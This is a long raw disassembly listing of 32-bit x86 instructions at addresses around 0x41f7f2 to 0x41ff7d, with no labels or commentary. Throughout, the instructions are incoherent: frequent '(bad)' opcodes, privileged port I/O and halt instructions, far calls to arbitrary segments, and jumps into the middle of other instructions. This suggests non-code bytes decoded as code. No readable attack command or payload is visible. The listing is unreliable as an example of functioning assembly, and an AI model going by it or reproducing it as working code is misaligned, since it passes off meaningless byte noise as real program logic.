  41f7f2:	shl    DWORD PTR [edi+ebp*8+0x578288bc],1
  41f7f9:	mov    edi,DWORD PTR [ebx+0x0]
  41f7fc:	leave  
  41f7fd:	outs   dx,DWORD PTR ds:[esi]
  41f7fe:	int3   
  41f7ff:	cmp    esi,esp
  41f801:	shl    BYTE PTR [eax-0x28316e12],1
  41f807:	adc    ah,dh
  41f809:	add    eax,0x6e4bdc8c
  41f80e:	sbb    BYTE PTR [edi+ebp*1],0xa9
  41f812:	jge    0x41f85c
  41f814:	daa    
  41f815:	jo     0x41f847
  41f817:	lds    eax,FWORD PTR [ecx+0x7a]
  41f81a:	(bad)  
  41f81b:	adc    edx,DWORD PTR [esi+0x7ac0f218]
  41f821:	call   0x9a57:0xd9b1aa72
  41f828:	xor    al,0xa4
  41f82a:	fcom   DWORD PTR [esi-0x69]
  41f82d:	jp     0x41f843
  41f82f:	in     eax,0x46
  41f831:	hlt    
  41f832:	retf   
  41f833:	icebp  
  41f834:	std    
  41f835:	test   DWORD PTR [edi+0x64],0x5a80e935
  41f83c:	enter  0x2d47,0xc8
  41f840:	add    ch,BYTE PTR [eax]
  41f842:	mov    edx,DWORD PTR [edi+0x3b]
  41f845:	push   ebp
  41f846:	cmp    DWORD PTR [edi],ecx
  41f848:	xor    ebp,edi
  41f84a:	(bad)  
  41f84b:	nop
  41f84c:	adc    eax,0xe7488e51
  41f851:	retf   
  41f852:	mov    ebp,0x67b95d11
  41f857:	call   0x1edf8cd9
  41f85c:	les    edi,FWORD PTR [edx]
  41f85e:	in     eax,0xe
  41f860:	iret   
  41f861:	mov    edi,0xa8a0f35d
  41f866:	fisttp WORD PTR [edi]
  41f868:	mov    esp,0x5be00441
  41f86d:	dec    esp
  41f86e:	fld    TBYTE PTR [edx]
  41f870:	adc    al,0x7e
  41f872:	inc    edi
  41f873:	es inc DWORD PTR gs:[ebp+0x4c2178cb]
  41f87b:	imul   esp
  41f87d:	cld    
  41f87e:	mov    esi,0x6e4613f
  41f883:	jne    0x41f8b6
  41f885:	int    0x48
  41f887:	mov    ah,0x5
  41f889:	sahf   
  41f88a:	rol    DWORD PTR [esi],cl
  41f88c:	cwde   
  41f88d:	mov    ebx,0xa097b3e3
  41f892:	push   esi
  41f893:	mov    esp,0x747607ca
  41f898:	adc    BYTE PTR [eax+0x3c],ah
  41f89b:	jp     0x41f82b
  41f89d:	xor    bh,dl
  41f89f:	cmp    eax,0x493a2b58
  41f8a4:	leave  
  41f8a5:	dec    edi
  41f8a6:	inc    edx
  41f8a7:	xor    DWORD PTR [eax+0x714e2a5a],ebp
  41f8ad:	jecxz  0x41f8aa
  41f8af:	lock shl DWORD PTR [esi-0x64],cl
  41f8b3:	xchg   edx,eax
  41f8b4:	sahf   
  41f8b5:	sbb    ecx,DWORD PTR ds:0x823b55f6
  41f8bb:	pop    edi
  41f8bc:	arpl   WORD PTR [edi],bp
  41f8be:	(bad)  
  41f8bf:	xor    BYTE PTR [edx+0x6e],bh
  41f8c2:	cli    
  41f8c3:	adc    eax,DWORD PTR [ecx-0x4524c228]
  41f8c9:	pop    ebx
  41f8ca:	test   ecx,ecx
  41f8cc:	repnz sar BYTE PTR [edi-0x4b75da39],1
  41f8d3:	or     BYTE PTR [ebp+0x64d1914e],0x29
  41f8da:	jp     0x41f867
  41f8dc:	lods   eax,DWORD PTR ds:[esi]
  41f8dd:	mov    al,0x7e
  41f8df:	inc    ebx
  41f8e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8e1:	fmul   QWORD PTR [edi]
  41f8e3:	mov    ecx,0xe73d55f2
  41f8e8:	iret   
  41f8e9:	loopne 0x41f8e2
  41f8eb:	jmp    0xf91a89d8
  41f8f0:	inc    esp
  41f8f1:	pop    ds
  41f8f2:	daa    
  41f8f3:	dec    edx
  41f8f4:	mov    bh,0xba
  41f8f6:	adc    DWORD PTR [ebx+ebp*4-0x4e565d44],edi
  41f8fd:	pop    ds
  41f8fe:	ins    BYTE PTR es:[edi],dx
  41f8ff:	sub    ebp,0x78
  41f902:	pushw  es
  41f904:	pop    eax
  41f905:	outs   dx,DWORD PTR ds:[esi]
  41f906:	pop    esi
  41f907:	push   edi
  41f908:	add    al,0xc3
  41f90a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f90b:	rol    DWORD PTR [esi+0x10],cl
  41f90e:	aam    0x6f
  41f910:	mov    esi,DWORD PTR [eax+0x50756484]
  41f916:	sub    al,0xf3
  41f918:	jb     0x41f8fb
  41f91a:	fucomip st,st(5)
  41f91c:	sbb    dl,BYTE PTR [edi-0x60c27e34]
  41f922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f923:	inc    edi
  41f924:	imul   DWORD PTR [esi-0x46]
  41f927:	mov    BYTE PTR [edi],bh
  41f929:	mov    ebx,0x616bdb66
  41f92e:	dec    edx
  41f92f:	out    dx,al
  41f930:	and    eax,0x70fb1731
  41f935:	cwde   
  41f936:	inc    ebp
  41f937:	adc    DWORD PTR [edx-0x748410b5],ebp
  41f93d:	mov    DWORD PTR [edi],edx
  41f93f:	pop    edx
  41f940:	dec    ecx
  41f941:	xchg   edx,eax
  41f942:	inc    ebp
  41f943:	pusha  
  41f944:	aaa    
  41f945:	setnp  BYTE PTR [esi+0x4d7e9ad8]
  41f94c:	rcl    DWORD PTR [ebp+ebp*4-0x3a],0xc4
  41f951:	popa   
  41f952:	mov    dl,0xa3
  41f954:	or     BYTE PTR [eax-0x69],ah
  41f957:	clc    
  41f958:	out    dx,al
  41f959:	imul   edi,eax,0x12
  41f95c:	scas   al,BYTE PTR es:[edi]
  41f95d:	adc    al,0xb0
  41f95f:	jg     0x41f932
  41f961:	mov    ds:0x77e7a394,al
  41f966:	into   
  41f967:	cwde   
  41f968:	test   eax,0x7e770015
  41f96d:	mov    ds:0x9ddd2df3,al
  41f972:	cld    
  41f973:	lods   al,BYTE PTR ds:[esi]
  41f974:	mov    cl,BYTE PTR [ebp+0x4991e8d0]
  41f97a:	in     al,dx
  41f97b:	push   edx
  41f97c:	ret    
  41f97d:	adc    dl,ah
  41f97f:	std    
  41f980:	xor    cl,al
  41f982:	dec    ebx
  41f983:	jae    0x41f924
  41f985:	inc    ebp
  41f986:	arpl   WORD PTR ds:0x37528fe6,ax
  41f98c:	cld    
  41f98d:	cwde   
  41f98e:	out    0xd9,eax
  41f990:	test   al,0x35
  41f992:	out    dx,al
  41f993:	sub    DWORD PTR [eax+0x19229074],ecx
  41f999:	pop    ebp
  41f99a:	mov    edx,0xae58b9bc
  41f99f:	and    esi,DWORD PTR [eax-0x44]
  41f9a2:	ret    
  41f9a3:	out    dx,al
  41f9a4:	sahf   
  41f9a5:	test   eax,0xcdfb9678
  41f9aa:	jp     0x41f99a
  41f9ac:	test   BYTE PTR ds:0xae66085,dh
  41f9b2:	test   eax,0xd357fae3
  41f9b7:	xor    dh,BYTE PTR [esi+eax*2-0x9]
  41f9bb:	cmp    dh,bl
  41f9bd:	mov    DWORD PTR [ecx+0x2e9efe69],edi
  41f9c3:	test   eax,0x4d168457
  41f9c8:	sbb    al,0xcb
  41f9ca:	in     al,0xf1
  41f9cc:	and    BYTE PTR [edx],bh
  41f9ce:	mov    ebx,0xb29e7099
  41f9d3:	dec    edi
  41f9d4:	lock lods al,BYTE PTR gs:[esi]
  41f9d7:	shl    esp,cl
  41f9d9:	(bad)
  41f9dc:	(bad)  
  41f9dd:	push   ecx
  41f9de:	xchg   ebp,eax
  41f9df:	fwait
  41f9e0:	pop    esi
  41f9e1:	int    0x2d
  41f9e3:	out    0x55,eax
  41f9e5:	and    al,0xf3
  41f9e7:	xor    ecx,DWORD PTR [ecx]
  41f9e9:	inc    eax
  41f9ea:	xor    DWORD PTR [edx+0x7a6f9a11],esp
  41f9f0:	es rol bh,0xe0
  41f9f4:	jmp    0x41f9e5
  41f9f6:	loop   0x41fa34
  41f9f8:	cmp    eax,0x4a16ed9b
  41f9fd:	rcr    DWORD PTR es:[esi],0x54
  41fa01:	out    0x6f,eax
  41fa03:	aas    
  41fa04:	jl     0x41f99b
  41fa06:	sbb    al,cl
  41fa08:	jo     0x41fa52
  41fa0a:	add    edx,edx
  41fa0c:	call   0x5590:0x6181a254
  41fa13:	adc    BYTE PTR [esi+eiz*4],0x80
  41fa17:	gs fucom st(3)
  41fa1a:	or     ah,0x86
  41fa1d:	lds    ebp,FWORD PTR [ebp+0x37]
  41fa20:	dec    bh
  41fa22:	(bad)  
  41fa23:	sub    ah,dl
  41fa25:	fisubr WORD PTR [edi]
  41fa27:	test   BYTE PTR [esi],0x75
  41fa2a:	add    ebx,esi
  41fa2c:	in     al,0x7
  41fa2e:	sbb    ebx,eax
  41fa30:	mov    dh,0x99
  41fa32:	ret    0xe896
  41fa35:	cmp    al,0xd
  41fa37:	and    DWORD PTR [edi-0x216ff119],0x28
  41fa3e:	or     BYTE PTR [eax-0x2e8a45e6],0x30
  41fa45:	adc    eax,0x85ec3aa2
  41fa4a:	in     eax,dx
  41fa4b:	jno    0x41fa0c
  41fa4d:	in     eax,dx
  41fa4e:	sub    BYTE PTR ss:[eax-0x60719ceb],cl
  41fa55:	cwde   
  41fa56:	popa   
  41fa57:	mov    bh,0x6a
  41fa59:	shl    DWORD PTR [esi+0x53],0x57
  41fa5d:	(bad)  
  41fa5e:	xchg   edi,eax
  41fa5f:	push   esi
  41fa60:	jp     0x41fa71
  41fa62:	sub    ebp,DWORD PTR [ecx+eiz*4]
  41fa65:	jae    0x41facb
  41fa67:	mov    edi,0xb0898ee3
  41fa6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa6d:	push   esi
  41fa6e:	xor    esp,DWORD PTR [ebp+0x33dfccdd]
  41fa74:	out    dx,eax
  41fa75:	mov    eax,0xc184b7
  41fa7a:	(bad)
  41fa7d:	push   ebp
  41fa7e:	inc    esi
  41fa7f:	jle    0x41fada
  41fa81:	or     BYTE PTR [edi-0x16],al
  41fa84:	sub    eax,0xa128631b
  41fa89:	inc    edx
  41fa8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa8b:	nop
  41fa8c:	mov    ebx,ebx
  41fa8e:	addr16 test al,0xee
  41fa91:	push   ebx
  41fa92:	in     eax,0x2b
  41fa94:	stos   DWORD PTR es:[edi],eax
  41fa95:	jmp    0x8a5efc14
  41fa9a:	sahf   
  41fa9b:	out    dx,al
  41fa9c:	arpl   WORD PTR [edx+0x5a],cx
  41fa9f:	cli    
  41faa0:	jns    0x41fac4
  41faa2:	bound  ebp,QWORD PTR [eax]
  41faa4:	mov    es:0x8c404899,al
  41faaa:	aam    0x8d
  41faac:	add    dh,BYTE PTR [ebp-0x7c20dcda]
  41fab2:	and    al,0xbd
  41fab4:	lock ret 0x172d
  41fab8:	jle    0x41fac3
  41faba:	mov    ch,0x22
  41fabc:	nop
  41fabd:	and    al,0x36
  41fabf:	xor    al,0x66
  41fac1:	repz ficom DWORD PTR [ebp+0x23e2832b]
  41fac8:	fist   DWORD PTR [ecx+0x14]
  41facb:	sub    BYTE PTR [ebx-0x4e],0x12
  41facf:	xchg   BYTE PTR cs:[eax],cl
  41fad2:	jae    0x41facf
  41fad4:	mov    edx,0x7a09b964
  41fad9:	and    al,0xd0
  41fadb:	push   cs
  41fadc:	dec    eax
  41fadd:	xchg   ebx,eax
  41fade:	push   ss
  41fadf:	xor    BYTE PTR [esi+ebp*4+0x6d],0xb4
  41fae4:	retf   
  41fae5:	mov    WORD PTR [edx+edi*2-0x2fcd197d],?
  41faec:	xor    al,0x1f
  41faee:	in     eax,0x78
  41faf0:	es aam 0xa3
  41faf3:	or     al,0x61
  41faf5:	sbb    eax,0xf6f2cb28
  41fafa:	stos   BYTE PTR es:[edi],al
  41fafb:	jae    0x41fb4f
  41fafd:	push   esi
  41fafe:	cld    
  41faff:	push   cs
  41fb00:	inc    edx
  41fb01:	cmp    eax,eax
  41fb03:	add    al,BYTE PTR [ebp+0x19]
  41fb06:	pop    ebx
  41fb07:	les    edi,FWORD PTR [ecx+0x60]
  41fb0a:	ss hlt 
  41fb0c:	push   ds
  41fb0d:	xchg   edx,eax
  41fb0e:	mov    ecx,0xb1f66e64
  41fb13:	test   al,0xf0
  41fb15:	cmp    eax,0x2e15f402
  41fb1a:	push   edx
  41fb1b:	xor    ebx,DWORD PTR fs:[ebp-0x6feb7c12]
  41fb22:	repz in al,0x6
  41fb25:	push   0xc41e6444
  41fb2a:	adc    BYTE PTR [esi-0x7335baa1],bl
  41fb30:	out    0x2,eax
  41fb32:	mov    DWORD PTR [ecx],esp
  41fb34:	(bad)  
  41fb35:	sbb    esi,eax
  41fb37:	ss jnp 0x41fb9e
  41fb3a:	push   0xb0abc0d9
  41fb3f:	push   edx
  41fb40:	jo     0x41fb1f
  41fb42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb43:	pop    esp
  41fb44:	mov    eax,0xd4d463d1
  41fb49:	and    ch,BYTE PTR [ebp-0x3ae622b0]
  41fb4f:	xor    ah,BYTE PTR [ebx-0x9]
  41fb52:	shl    eax,0x6e
  41fb55:	pop    esp
  41fb56:	call   0x396b7982
  41fb5b:	fmul   DWORD PTR [ebx+0x2a]
  41fb5e:	sbb    DWORD PTR [edi],0xfca7fff6
  41fb64:	js     0x41fbb3
  41fb66:	ds (bad) 
  41fb68:	call   0xdb2a8253
  41fb6d:	loope  0x41fb99
  41fb6f:	aas    
  41fb70:	hlt    
  41fb71:	mov    bh,0xa7
  41fb73:	lds    esp,FWORD PTR [ebx]
  41fb75:	pop    eax
  41fb76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb77:	leave  
  41fb78:	leave  
  41fb79:	push   ebx
  41fb7a:	pop    ecx
  41fb7b:	sub    al,0xd5
  41fb7d:	pop    edx
  41fb7e:	les    eax,FWORD PTR [edx-0x79]
  41fb81:	and    bl,BYTE PTR [edi+eax*2]
  41fb84:	xchg   ebx,eax
  41fb85:	(bad)  [ebx*4+0x2f5bebe8]
  41fb8c:	lahf   
  41fb8d:	jle    0x41fb92
  41fb8f:	fs jmp 0x41fc09
  41fb92:	(bad)  
  41fb93:	shr    BYTE PTR [ecx],0xf
  41fb96:	aas    
  41fb97:	cmp    al,0xea
  41fb99:	or     ecx,DWORD PTR [esi+eax*2-0x4ff09ca1]
  41fba0:	lahf   
  41fba1:	mov    ebx,DWORD PTR [ebx-0x3e7476df]
  41fba7:	jg     0x41fb52
  41fba9:	nop
  41fbaa:	and    DWORD PTR [edx+0x6d5b73d4],ebx
  41fbb0:	loopne 0x41fb4e
  41fbb2:	push   0x5f8a60cd
  41fbb7:	addr16 in eax,0x6d
  41fbba:	stos   BYTE PTR es:[edi],al
  41fbbb:	push   ss
  41fbbc:	mov    bh,BYTE PTR [edi+edx*1]
  41fbbf:	or     DWORD PTR gs:[ecx-0x751d9e51],eax
  41fbc6:	ins    BYTE PTR es:[edi],dx
  41fbc7:	inc    esp
  41fbc8:	les    edi,FWORD PTR gs:[edx-0x3050fe65]
  41fbcf:	inc    esp
  41fbd0:	mov    ebp,DWORD PTR [ebp-0x3c]
  41fbd3:	dec    ecx
  41fbd4:	or     al,BYTE PTR [edi+eax*4+0xc5d368d]
  41fbdb:	lock xor edx,DWORD PTR [esi-0x37]
  41fbdf:	repz xor al,0x88
  41fbe2:	test   eax,0x485fc03b
  41fbe7:	jno    0x41fc38
  41fbe9:	add    al,0xaf
  41fbeb:	(bad)  
  41fbec:	imul   ebp,DWORD PTR [ecx],0x2bc3f603
  41fbf2:	push   0xffffff90
  41fbf4:	push   ebp
  41fbf5:	mov    ds:0x4006823c,al
  41fbfa:	je     0x41fbc1
  41fbfc:	mov    esp,0x2014a0e
  41fc01:	mov    bl,0x4
  41fc03:	outs   dx,BYTE PTR ds:[esi]
  41fc04:	push   esi
  41fc05:	sahf   
  41fc06:	in     eax,0x28
  41fc08:	pop    ds
  41fc09:	mov    esp,0xa705a57b
  41fc0e:	sub    ah,al
  41fc10:	aam    0x41
  41fc12:	jle    0x41fc90
  41fc14:	inc    ebx
  41fc15:	xchg   ebp,eax
  41fc16:	mov    ebp,0x874e62e0
  41fc1b:	lods   eax,DWORD PTR ds:[esi]
  41fc1c:	jo     0x41fbc1
  41fc1e:	and    BYTE PTR [ebp+0x65bac804],0x84
  41fc25:	enter  0x8618,0x39
  41fc29:	(bad)
  41fc2c:	inc    ebp
  41fc2d:	std    
  41fc2e:	lds    ebx,FWORD PTR [edx-0x29]
  41fc31:	fdivrp st(1),st
  41fc33:	jo     0x41fbcd
  41fc35:	and    ebx,edi
  41fc37:	in     eax,0xb3
  41fc39:	imul   eax,DWORD PTR [eax],0xc36327ef
  41fc3f:	std    
  41fc40:	or     esi,DWORD PTR [edi+0x6]
  41fc43:	loop   0x41fc37
  41fc45:	and    ebx,DWORD PTR [ebp+esi*8+0x44]
  41fc49:	mov    edx,0xb56ee72
  41fc4e:	adc    edx,DWORD PTR ds:0x4012d69e
  41fc54:	mov    esp,edi
  41fc56:	xchg   ebx,eax
  41fc57:	mov    ebx,0x9a807476
  41fc5c:	jo     0x41fbed
  41fc5e:	mov    eax,ds:0x3a9a3b38
  41fc63:	pop    ebx
  41fc64:	add    ebp,esi
  41fc66:	call   0xe8f6:0x7fbf5d4c
  41fc6d:	sbb    bl,cl
  41fc6f:	mov    edi,0xaed434b
  41fc74:	pusha  
  41fc75:	in     al,dx
  41fc76:	(bad)  
  41fc77:	pop    ecx
  41fc78:	xchg   edi,eax
  41fc79:	ja     0x41fccb
  41fc7b:	div    al
  41fc7d:	call   FWORD PTR [esi+0x17]
  41fc80:	xor    eax,0xdf60b739
  41fc85:	ja     0x41fc7f
  41fc87:	mov    esp,0x71cfaa4f
  41fc8c:	imul   ecx,DWORD PTR [eax-0x3c],0x8d37944
  41fc93:	cmp    edx,DWORD PTR [esi-0x3b]
  41fc96:	jge    0x41fc53
  41fc98:	add    DWORD PTR [eax],esi
  41fc9a:	stc    
  41fc9b:	int    0x8a
  41fc9d:	(bad)  
  41fc9f:	lods   eax,DWORD PTR ds:[esi]
  41fca0:	fisubr DWORD PTR [esi-0x15c3ac58]
  41fca6:	fistp  DWORD PTR [ecx+0x18f5d907]
  41fcac:	mov    edx,edi
  41fcae:	push   ss
  41fcaf:	arpl   si,bx
  41fcb1:	in     al,dx
  41fcb2:	inc    esp
  41fcb3:	fimul  DWORD PTR [eax+0x7576aabf]
  41fcb9:	bound  ebp,QWORD PTR [eax-0x73]
  41fcbc:	mov    ebx,0x364a7c87
  41fcc1:	mov    ecx,0x9c19b257
  41fcc6:	pop    edi
  41fcc7:	push   ebp
  41fcc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcc9:	rcl    BYTE PTR [ecx+0x14],1
  41fccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fccd:	aas    
  41fcce:	fcomip st,st(4)
  41fcd0:	fsubr  QWORD PTR [edx]
  41fcd2:	aas    
  41fcd3:	in     al,0xf3
  41fcd5:	push   ss
  41fcd6:	mov    bh,0x5f
  41fcd8:	fadd   QWORD PTR [ebp+0x72961813]
  41fcde:	pop    eax
  41fcdf:	mov    eax,ds:0xd3d46ba8
  41fce4:	sar    BYTE PTR [edi],1
  41fce6:	mov    bl,0xda
  41fce8:	je     0x41fccb
  41fcea:	dec    edi
  41fceb:	leave  
  41fcec:	bound  ebx,QWORD PTR [eax]
  41fcee:	sbb    al,0x16
  41fcf0:	nop
  41fcf1:	pop    ecx
  41fcf2:	mov    ?,WORD PTR [edx+0x3223d3dd]
  41fcf8:	in     al,0x4e
  41fcfa:	lahf   
  41fcfb:	dec    ebx
  41fcfc:	hlt    
  41fcfd:	scas   eax,DWORD PTR es:[edi]
  41fcfe:	stos   DWORD PTR es:[edi],eax
  41fcff:	mov    edi,0xa3830ae7
  41fd04:	pop    edx
  41fd05:	push   ecx
  41fd06:	call   0x58a100d9
  41fd0b:	mov    WORD PTR [ecx+0x19],es
  41fd0e:	daa    
  41fd0f:	(bad)  
  41fd10:	sbb    al,0x8e
  41fd12:	add    al,0x6f
  41fd14:	cli    
  41fd15:	daa    
  41fd16:	out    dx,eax
  41fd17:	stos   DWORD PTR es:[edi],eax
  41fd18:	mov    esi,0x87caa3f
  41fd1d:	(bad)  
  41fd1e:	push   esi
  41fd1f:	fcomp  DWORD PTR [eax-0x454f2a65]
  41fd25:	cmp    edx,DWORD PTR [ebx-0x52]
  41fd28:	ror    BYTE PTR [ebx-0x579a35d8],1
  41fd2e:	fs push 0xffffffb1
  41fd31:	xchg   DWORD PTR [edx+0x57],esp
  41fd34:	lock cmp ch,BYTE PTR ds:0x5e389482
  41fd3b:	in     eax,dx
  41fd3c:	call   0x2ade:0x93466fc3
  41fd43:	cmp    BYTE PTR [eax+0x41],0x98
  41fd47:	imul   ebp,DWORD PTR [edx+0x1f],0x38
  41fd4b:	pop    eax
  41fd4c:	inc    esp
  41fd4d:	fisttp DWORD PTR [edi]
  41fd4f:	xchg   DWORD PTR [edx],ebx
  41fd51:	sub    DWORD PTR [edx],ecx
  41fd53:	mov    ah,0xc1
  41fd55:	inc    edi
  41fd56:	enter  0x1282,0xe
  41fd5a:	jmp    0x41fd24
  41fd5c:	shl    DWORD PTR [edx-0x69955e6b],cl
  41fd62:	sar    ah,0xc1
  41fd65:	hlt    
  41fd66:	push   eax
  41fd67:	push   esi
  41fd68:	pop    edx
  41fd69:	push   0xffffffde
  41fd6b:	add    ebx,ebx
  41fd6d:	and    edi,DWORD PTR [eax-0x427bbeed]
  41fd73:	sbb    eax,DWORD PTR [ecx+esi*4]
  41fd76:	fsubr  DWORD PTR [edi]
  41fd78:	lea    ebp,[esi+0x35]
  41fd7b:	nop
  41fd7c:	dec    edi
  41fd7d:	aam    0x17
  41fd7f:	into   
  41fd80:	inc    ecx
  41fd81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd83:	pop    esp
  41fd84:	clc    
  41fd85:	sub    eax,DWORD PTR [edi+ebp*4+0x25e42c2d]
  41fd8c:	pop    edi
  41fd8d:	ds jp  0x41fdee
  41fd90:	repnz mov eax,0x722c8508
  41fd96:	aas    
  41fd97:	adc    esi,DWORD PTR [edx]
  41fd99:	push   ebp
  41fd9a:	es pushf 
  41fd9c:	cli    
  41fd9d:	or     DWORD PTR [ebp+0x4f],eax
  41fda0:	adc    DWORD PTR [esi],ecx
  41fda2:	jne    0x41fd92
  41fda4:	(bad)  
  41fda5:	rcl    BYTE PTR [ecx+ebp*8],0x85
  41fda9:	xlat   BYTE PTR ds:[ebx]
  41fdaa:	push   0x97507760
  41fdaf:	ja     0x41fd6b
  41fdb1:	xchg   edi,eax
  41fdb2:	enter  0x4462,0x8c
  41fdb6:	mov    ebx,0xa3360288
  41fdbb:	fadd   QWORD PTR [edx-0x1039cd59]
  41fdc1:	lea    edi,[edx-0x22b46fbf]
  41fdc7:	test   al,0xef
  41fdc9:	scas   al,BYTE PTR es:[edi]
  41fdca:	xchg   esp,eax
  41fdcb:	or     ch,0x5
  41fdce:	mov    ebx,0x68c7343
  41fdd3:	dec    ecx
  41fdd4:	retf   
  41fdd5:	das    
  41fdd6:	iret   
  41fdd7:	jmp    0x41fe16
  41fdd9:	pop    edx
  41fdda:	mov    ecx,0xee974fb7
  41fddf:	out    0x1c,al
  41fde1:	sub    BYTE PTR [ecx+0x6c],cl
  41fde4:	cmp    edi,eax
  41fde6:	jg     0x41fda6
  41fde8:	mov    esp,?
  41fdea:	xchg   esi,eax
  41fdeb:	or     al,0x87
  41fded:	outs   dx,DWORD PTR ds:[esi]
  41fdee:	mov    eax,ds:0x4a3ff890
  41fdf3:	ret    0x4797
  41fdf6:	mov    DWORD PTR [edi],ebx
  41fdf8:	cs (bad) 
  41fdfa:	cmp    BYTE PTR [ecx-0x6e],cl
  41fdfd:	mov    cl,0x73
  41fdff:	in     eax,dx
  41fe00:	gs jbe 0x41fe79
  41fe03:	movhps QWORD PTR [ebx],xmm6
  41fe06:	fsubr  QWORD PTR [ecx-0xd2c9247]
  41fe0c:	jmp    0x41fdf3
  41fe0e:	jno    0x41fe0a
  41fe10:	adc    eax,0x13684fd2
  41fe15:	cmp    ch,BYTE PTR [eax+0x31de6d6e]
  41fe1b:	jnp    0x41fe7c
  41fe1d:	pop    ss
  41fe1e:	scas   al,BYTE PTR es:[edi]
  41fe1f:	in     al,dx
  41fe20:	jb     0x41fdd0
  41fe22:	and    ecx,esp
  41fe24:	scas   eax,DWORD PTR es:[edi]
  41fe25:	mov    esp,0x4f3303e3
  41fe2a:	dec    ebp
  41fe2b:	cmp    eax,0xa59e3923
  41fe30:	adc    ah,BYTE PTR [ebx+0x52ca0d9d]
  41fe36:	cmp    al,0x31
  41fe38:	inc    ebp
  41fe39:	sar    BYTE PTR [ecx+0x133d233],0xb0
  41fe40:	nop
  41fe41:	xchg   DWORD PTR [ecx-0x36],eax
  41fe44:	imul   esp,DWORD PTR [edx+0x7a9f219a],0xaec58b9d
  41fe4e:	inc    esi
  41fe4f:	sahf   
  41fe50:	test   al,0x34
  41fe52:	cwde   
  41fe53:	sbb    eax,0x2155e92e
  41fe58:	mov    BYTE PTR [esi],bl
  41fe5a:	add    bp,WORD PTR [ebx]
  41fe5d:	and    esp,DWORD PTR [edx+0x6]
  41fe60:	dec    esi
  41fe61:	or     dh,dh
  41fe63:	in     al,0x2
  41fe65:	sbb    BYTE PTR [eax+0xd898b51],0xfc
  41fe6c:	test   DWORD PTR [ecx-0x7fbc22de],0x90ff171e
  41fe76:	das    
  41fe77:	fs push eax
  41fe79:	jno    0x41fe5a
  41fe7b:	mov    BYTE PTR [ebp-0x6e],bl
  41fe7e:	add    edi,DWORD PTR [ecx]
  41fe80:	test   al,0x59
  41fe82:	mov    ch,0xd1
  41fe84:	add    esp,eax
  41fe86:	pop    esp
  41fe87:	rcr    ecx,0xc7
  41fe8a:	aaa    
  41fe8b:	in     eax,dx
  41fe8c:	les    edi,FWORD PTR [edi-0xa]
  41fe8f:	adc    BYTE PTR [edi-0x6a5add1d],bh
  41fe95:	cmp    ebx,DWORD PTR [ebx+0x47]
  41fe98:	pop    eax
  41fe99:	xchg   esi,eax
  41fe9a:	rol    DWORD PTR [ecx-0x7490488b],cl
  41fea0:	fisubr WORD PTR [esi-0x7116a7ea]
  41fea6:	out    0xdd,eax
  41fea8:	repz cmc 
  41feaa:	fninit 
  41feac:	and    bh,BYTE PTR [eax]
  41feae:	in     al,dx
  41feaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41feb0:	sub    eax,0xc92dda02
  41feb5:	dec    esi
  41feb6:	jp     0x41fe49
  41feb8:	or     ch,BYTE PTR [eax]
  41feba:	cmp    BYTE PTR [edx+0x76],ch
  41febd:	in     eax,0x8b
  41febf:	in     al,0xf8
  41fec1:	stos   DWORD PTR es:[edi],eax
  41fec2:	neg    DWORD PTR [esi+0x3c]
  41fec5:	loope  0x41ff41
  41fec7:	rol    DWORD PTR [ecx-0x2d],1
  41feca:	cmp    BYTE PTR [ebp+0x7a],ah
  41fecd:	dec    ebp
  41fece:	imul   esi,DWORD PTR [esi+ebx*8],0xffffff90
  41fed2:	pop    ss
  41fed3:	ja     0x41fef6
  41fed5:	mov    ds:0x5029b52,eax
  41feda:	jns    0x41fe67
  41fedc:	adc    eax,0x9048f3f8
  41fee1:	xor    ah,BYTE PTR [ebp+0x772e838e]
  41fee7:	ret    0xd198
  41feea:	add    BYTE PTR [eax],dh
  41feec:	aad    0x31
  41feee:	jae    0x41febe
  41fef0:	call   0x8995:0xe47c5d11
  41fef7:	iret   
  41fef8:	loop   0x41ff38
  41fefa:	call   0x9b3a:0xf4d8a413
  41ff01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff02:	xchg   edx,eax
  41ff03:	jae    0x41ff31
  41ff05:	das    
  41ff06:	(bad)
  41ff09:	jnp    0x41ff84
  41ff0b:	lods   eax,DWORD PTR ds:[esi]
  41ff0c:	adc    edi,DWORD PTR [esi+0x5]
  41ff0f:	sbb    eax,DWORD PTR [ebp-0x123e5d69]
  41ff15:	jp     0x41fee7
  41ff17:	inc    ebp
  41ff18:	push   ebp
  41ff19:	rcr    BYTE PTR [ebx],0xbf
  41ff1c:	cli    
  41ff1d:	cmp    eax,0x2fa1696e
  41ff22:	mov    DWORD PTR [ecx],ecx
  41ff24:	add    BYTE PTR [edi+edx*2],ah
  41ff27:	outs   dx,BYTE PTR ds:[esi]
  41ff28:	cmp    eax,0xf925ddfb
  41ff2d:	in     al,0x4
  41ff2f:	cwde   
  41ff30:	lds    edi,FWORD PTR [ecx+0x38]
  41ff33:	and    BYTE PTR [bx],bl
  41ff36:	adc    esi,DWORD PTR [eax+0x7f]
  41ff39:	jmp    0x8078:0x6ef8b072
  41ff40:	sbb    eax,0x95e7ea22
  41ff45:	repnz mov esi,0xe3e6bcb5
  41ff4b:	lods   eax,DWORD PTR ds:[esi]
  41ff4c:	rcl    BYTE PTR [ebx+edx*4+0x7ac85a03],cl
  41ff53:	or     esp,eax
  41ff55:	stc    
  41ff56:	lods   eax,DWORD PTR ds:[esi]
  41ff57:	dec    ebp
  41ff58:	sub    edx,ecx
  41ff5a:	fmul   QWORD PTR [esi-0x2a7af198]
  41ff60:	xor    DWORD PTR [edi+0x6ebf36d3],ebx
  41ff66:	mov    ebp,0x7ab15601
  41ff6b:	not    dl
  41ff6d:	cmp    eax,0xd8c9597f
  41ff72:	mov    ebp,0x4ee93943
  41ff77:	rcr    DWORD PTR [ebx+0x25458ee1],cl
  41ff7d:	sti    
